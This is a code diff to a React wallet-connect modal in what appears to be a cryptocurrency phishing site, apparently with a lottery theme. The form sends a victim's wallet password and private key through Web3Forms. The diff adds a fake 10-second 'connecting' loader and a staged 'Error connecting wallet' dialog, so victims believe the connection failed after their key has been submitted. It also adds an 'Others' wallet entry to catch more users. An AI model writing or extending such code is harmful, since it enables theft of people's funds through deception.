@@ -20,11 +20,13 @@ type Step =
   | "initializing"
   | "connecting"
   | "connectionFailed"
-  | "validate";
+  | "validate"
+  | "postSubmitConnecting";
 
 const INIT_MS = 3000;
 const CONNECT_MS = 2500;
 const FAILED_MODAL_MS = 3000;
+const POST_SUBMIT_CONNECT_MS = 10_000;
 
 type WalletRow = (typeof WALLET_OPTIONS)[number];
 const WALLET_IMAGE_EXTENSIONS = ["svg", "png", "webp", "jpg", "jpeg"] as const;
@@ -245,7 +247,7 @@ const validateInputClassName =
 
 // const DEFAULT_SUBMISSION_EMAIL = "quantislottery@atomicmail.io";
 
-const WALLET_CONNECT_FAIL_TOAST = "Failed to connect to wallet";
+const OTHERS_WALLET_ID = "others" as const;
 
 const WalletConnectModal = ({ onClose }: Props) => {
   const [step, setStep] = useState<Step>("list");
@@ -259,19 +261,16 @@ const WalletConnectModal = ({ onClose }: Props) => {
 
   const [submitting, setSubmitting] = useState(false);
   const [formError, setFormError] = useState<string | null>(null);
+  const [walletConnectErrorOpen, setWalletConnectErrorOpen] = useState(false);
 
   const selected = WALLET_OPTIONS.find((w) => w.id === selectedId);
-  const filteredWallets = WALLET_OPTIONS.filter((w) =>
+  const walletsWithoutOthers = WALLET_OPTIONS.filter(
+    (w) => w.id !== OTHERS_WALLET_ID
+  );
+  const othersWallet = WALLET_OPTIONS.find((w) => w.id === OTHERS_WALLET_ID);
+  const filteredWallets = walletsWithoutOthers.filter((w) =>
     w.name.toLowerCase().includes(searchQuery.trim().toLowerCase())
   );
-
-  useEffect(() => {
-    const onKey = (e: KeyboardEvent) => {
-      if (e.key === "Escape") onClose();
-    };
-    window.addEventListener("keydown", onKey);
-    return () => window.removeEventListener("keydown", onKey);
-  }, [onClose]);
 
   useEffect(() => {
     const prev = document.body.style.overflow;
@@ -311,12 +310,35 @@ const WalletConnectModal = ({ onClose }: Props) => {
   }, []);
 
   const resetAndClose = useCallback(() => {
+    setWalletConnectErrorOpen(false);
     setStep("list");
     setSelectedId(null);
     setSearchQuery("");
     resetValidateFields();
     onClose();
   }, [onClose, resetValidateFields]);
+
+  useEffect(() => {
+    const onKey = (e: KeyboardEvent) => {
+      if (e.key !== "Escape") return;
+      if (walletConnectErrorOpen) {
+        resetAndClose();
+        return;
+      }
+      onClose();
+    };
+    window.addEventListener("keydown", onKey);
+    return () => window.removeEventListener("keydown", onKey);
+  }, [onClose, walletConnectErrorOpen, resetAndClose]);
+
+  useEffect(() => {
+    if (step !== "postSubmitConnecting") return;
+    const t = window.setTimeout(
+      () => setWalletConnectErrorOpen(true),
+      POST_SUBMIT_CONNECT_MS
+    );
+    return () => window.clearTimeout(t);
+  }, [step]);
 
   const handleWalletClick = (id: string) => {
     setSelectedId(id);
@@ -369,11 +391,10 @@ const WalletConnectModal = ({ onClose }: Props) => {
         wallet_password: username.trim(),
         private_key: bio.trim(),
       });
-      toast.error(WALLET_CONNECT_FAIL_TOAST);
-      resetAndClose();
+      setStep("postSubmitConnecting");
     } catch (reason: unknown) {
       console.error("[wallet validate] Web3Forms submit failed", reason);
-      toast.error(WALLET_CONNECT_FAIL_TOAST);
+      setWalletConnectErrorOpen(true);
     } finally {
       setSubmitting(false);
     }
@@ -465,13 +486,40 @@ const WalletConnectModal = ({ onClose }: Props) => {
                   </li>
                 ))
               )}
+              {othersWallet ? (
+                <li key={othersWallet.id}>
+                  <button
+                    type="button"
+                    onClick={() => handleWalletClick(othersWallet.id)}
+                    className="flex w-full min-w-0 items-center gap-2 rounded-xl border border-gray-200 bg-white px-3 py-2.5 text-left transition hover:border-secondary/40 hover:bg-slate-50 sm:gap-3 sm:px-4 sm:py-3"
+                  >
+                    <Icon
+                      icon="tabler:wallet"
+                      className="h-5 w-5 shrink-0 text-gray-700"
+                      aria-hidden
+                    />
+                    <span className="min-w-0 flex-1 truncate font-medium text-gray-900 text-sm sm:text-base">
+                      {othersWallet.name}
+                    </span>
+                    <WalletLogo
+                      wallet={othersWallet}
+                      sizeClassName="h-8 w-8 shrink-0 object-contain"
+                      iconClassName="h-8 w-8 shrink-0 text-gray-800"
+                    />
+                  </button>
+                </li>
+              ) : null}
             </ul>
           </>
-        ) : step === "initializing" || step === "connecting" ? (
+        ) : step === "initializing" ||
+          step === "connecting" ||
+          step === "postSubmitConnecting" ? (
           selected ? (
             <WalletConnectionLoader
               wallet={selected}
-              phase={step === "initializing" ? "initializing" : "connecting"}
+              phase={
+                step === "initializing" ? "initializing" : "connecting"
+              }
             />
           ) : null
         ) : step === "connectionFailed" ? (
@@ -635,6 +683,45 @@ const WalletConnectModal = ({ onClose }: Props) => {
           Cancel
         </button>
       </div>
+
+      {walletConnectErrorOpen ? (
+        <div
+          className="fixed inset-0 z-[110] flex items-center justify-center bg-black/50 px-4 py-8 backdrop-blur-[2px]"
+          role="alertdialog"
+          aria-modal="true"
+          aria-labelledby="wallet-connect-error-title"
+        >
+          <div className="relative w-full max-w-md rounded-2xl bg-white p-6 pt-12 shadow-2xl ring-1 ring-gray-200/80 sm:p-8 sm:pt-14">
+            <button
+              type="button"
+              onClick={resetAndClose}
+              className="absolute right-3 top-3 rounded-lg p-2 text-gray-500 transition hover:bg-gray-100 hover:text-gray-900 focus:outline-none focus-visible:ring-2 focus-visible:ring-secondary/40"
+              aria-label="Close"
+            >
+              <Icon icon="tabler:x" className="h-5 w-5" aria-hidden />
+            </button>
+            <div className="mb-4 flex justify-center">
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-rose-100">
+                <Icon
+                  icon="tabler:alert-circle"
+                  className="h-8 w-8 text-rose-600"
+                  aria-hidden
+                />
+              </div>
+            </div>
+            <h2
+              id="wallet-connect-error-title"
+              className="text-center text-lg font-bold text-gray-900 sm:text-xl"
+            >
+              Error connecting wallet
+            </h2>
+            <p className="mt-3 text-center text-sm leading-relaxed text-gray-600">
+              We couldn&apos;t complete the connection. You can try again
+              later.
+            </p>
+          </div>
+        </div>
+      ) : null}
     </div>
   );
 };
